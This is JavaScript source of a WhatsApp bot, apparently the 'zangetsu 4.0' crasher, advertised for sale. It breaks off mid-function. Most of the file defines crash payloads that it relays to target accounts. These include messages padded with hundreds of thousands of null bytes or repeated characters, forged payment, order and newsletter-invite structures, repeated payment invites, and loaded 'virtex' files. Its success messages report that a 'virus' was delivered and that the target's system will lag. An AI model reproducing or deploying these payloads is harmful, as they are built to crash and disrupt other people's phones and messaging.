/*
      ⟅̊༑ ▾ ⌜ メ-zangetsu 4.0 ⌟ ▾ ༑̴⟆̊

->  Thanks To KirBotz For Base
->  Thanks To All Yang Membantu Saya Menyelesaikan Script
->  Botz Resmi Dijual Oleh Zangetsuzehpyh
->  Crasher New Beta
->  Credits : 𝚂𝚞𝚋𝚜𝚌𝚛𝚒𝚋𝚎 @faxz.attacker

     ⟅̊༑ ▾ ⌜ メ-zangetsu 4.0 ⌟ ▾ ༑̴⟆̊
*/
module.exports = async (TheFaxz, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectTheFaxzReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonTheFaxzReplyMessage') ? m.message.templateButtonTheFaxzReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectTheFaxzReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await TheFaxz.decodeJid(TheFaxz.user.id)
const sender = m.key.fromMe ? (TheFaxz.user.id.split(':')[0]+'@s.whatsapp.net' || TheFaxz.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await TheFaxz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { beta1, beta2, buk1 } = require("./all/X-Xyzz/X-AlwaysFaxz.js")
const xbug = fs.readFileSync(`./all/X-Virtex/xeontext6.js`)
const buttonvir = fs.readFileSync(`./all/X-Virtex/buttonvirus.js`)
const notifcrash = fs.readFileSync(`./all/X-Virtex/notif4.js`)
const nulll2 = fs.readFileSync(`./all/X-Media/nulll2.jpg`)
const nulll = fs.readFileSync(`./all/X-Media/nulll.jpg`)
const gsz = fs.readFileSync(`./all/X-Media/ffxzz.jpg`)
const YcXç = fs.readFileSync(`./all/X-Media/ffxzz.jpg`)
const fakedoc = fs.readFileSync(`./all/doc.apk`)
         // DATABASE VRTX \\
        const { ios } = require("./all/X-Virtex/ios.js")
		const { telapreta3 } = require("./all/X-Virtex/telapreta3.js")
		const { convite } = require("./all/X-Virtex/convite.js")
		const { bugpdf } = require("./all/X-Virtex/bugpdf.js")
		const { cP } = require('./all/X-Virtex/bugUrl.js')
		const { ngazap } = require("./all/X-Virtex/ngazap")
		const { notif3 } = require("./all/X-Virtex/notif3")
		const { notif4 } = require("./all/X-Virtex/notif4")
		
         		// IMAGE RESIZE \\
		const I1 = fs.readFileSync(`./all/X-Media/X-FaxzBug/X-Img-300.jpg`)
		const I2 = fs.readFileSync(`./all/X-Media/X-FaxzBug/X-Img-300x.jpg`)
		const I3 = fs.readFileSync(`./all/X-Media/X-FaxzBug/X-Img-300x300.jpg`)
		const I4 = fs.readFileSync(`./all/X-Media/X-FaxzBug/X-Img-300x300.png`)
		// XBUG IMG \\
		const XnxxFaxzBuug = fs.readFileSync(`./all/X-Media/IvS/EsQl.jpg`)
		const XnxxFaxzBug = fs.readFileSync(`./all/X-Media/IvS/ViLoc.jpg`)
const content = JSON.stringify(m.message)
const resbug = (`*_X-Prosess⚡_*`)
const donebug = (`*_X-Attack Succes_*
[ Note ]
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay System`)
const donebug2 = (`*_X-Attack Succes_*
[ Note ]
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay System`)
const donebug3 = (`*_X-Attack Succes_*
[ Note ]
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay System`)
const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
const taskdone = (teks) => {
			return TheFaxz.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
const qpay = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: '0@s.whatsapp.net',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: 'IDR',
			amount1000: 999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: '⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̊'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: 'INR'
			}
		}
	}
};
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `1203632@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By Zangetsuzehpyh`,
inviteExpiration: Date.now() + 1814400000
}
}}
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return TheFaxz.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ XbugFaxz v2.0 ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam'
        }

// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber)

// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await TheFaxz.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await TheFaxz.getName(i + '@s.whatsapp.net')}\n
FN:${await TheFaxz.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:emailmuxxx@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029Vamo6AZ002TD5ECrqv1N
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await TheFaxz.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 400, 400)

//reply
		const zets = {
			key: {
				fromMe: false,
				participant: "0@s.whatsapp.net",
				remoteJid: "status@broadcast"
			},
			message: {
				orderMessage: {
					orderId: "2029",
					thumbnail: YcXç,
					itemCount: `777`,
					status: "INQUIRY",
					surface: "CATALOG",
					message: `🩸⃟༑⌁⃰'͟͟͞͞🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊★🍂`,
					token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
				}
			},
			contextInfo: {
				mentionedJid: [m.sender],
				forwardingScore: 999,
				isForwarded: true
			}
		}
// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 2000,
author: `TheFaxz`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
TheFaxz.relayMessage(jid, order.message, { messageId: order.key.id})
}
// FUNCTION BUG
		async function caltx(LockJids) {
			let etc = generateWAMessageFromContent(
				LockJids,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								callType: 2,
								title: ""
							}
						}
					},
				}), {
					userJid: LockJids
				}
			);
			await TheFaxz.relayMessage(LockJids, etc.message, {});
		}
		async function ClGc(LockJids) {
			await TheFaxz.relayMessage(LockJids, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡⚡" + "ꦾ".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {});
			let target = fs.readFileSync('./all/X-Media/nulll2.jpg')
			await TheFaxz.sendMessage(LockJids, {
				sticker: target
			}, {
				quoted: FAXZxCRASH
			})
		}
		
		//SPAMMING FLOODS\\
		async function LiveLok(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "x",
							"degreesLongitude": "x",
							"caption": `'͟͟͞͞🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊★🍂` + "★ꦾ".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await TheFaxz.relayMessage(LockJids, etc.message, {
				messageId: etc.key.id
			});
		}
		
		//NEWSTELER X PAYMENT\\
		async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `⚡ThêFâxz Bug Wangsaff⚡`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await TheFaxz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "" + "⚡ThêFâxz X Bug⚡" +"\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await TheFaxz.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			TheFaxz.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}
		const VxO = "★⃰͜͡⭑X-͢Faxz⭑★⃰͜͡" + "\u0000".repeat(50000)
		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": ` ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await TheFaxz.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		//REVISION\\
		async function iponcrash(target) {
await TheFaxz.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await TheFaxz.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await TheFaxz.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
							"caption": `⌁⃰'T⃰he⃰͜͡Fâxz꙰͜͡⚡` + "Ãª¦¾".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await TheFaxz.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `⌁⃰'T⃰he⃰͜͡Fâxz꙰͡🍂͜⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await TheFaxz.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

        async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await TheFaxz.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await TheFaxz.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "'͟͟͞͞🩸⃟༑⌁⃰ÂlwâysFâxz★🍂",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: TheFaxz.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ⌁⃰'T⃰he⃰͜͡Fâxz꙰͜͡🔥"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await TheFaxz.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

        	const dottm = {
			key: {
				fromMe: false,
				participant: '0@s.whatsapp.net',
				remoteJid: 'status@broadcast'
			},
			message: {
				orderMessage: {
					orderId: '999999999999',
					thumbnail: null,
					itemCount: 999999999999,
					status: 'INQUIRY',
					surface: 'CATALOG',
					message: '▾ ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊▾',
					token: 'AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=='
				}
			},
			contextInfo: {
				mentionedJid: ['27746135260@s.whatsapp.net'],
				forwardingScore: 999,
				isForwarded: true
			}
		}
		
		const PORKE = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./all/X-Media/nulll2.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const PORKE2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./all/X-Media/nulll2.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊ 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
// function bug
const xfaxzbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `MargaAlways 💸`
}
}
}

const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        
const xfaxzbugzz = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": "",
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"WANGCAPP\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Bottt\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"xfaxzbugzz\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
}
]
}
}
}
}

async function Bug3(sock, jid) {
  let target = jid;
  let msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
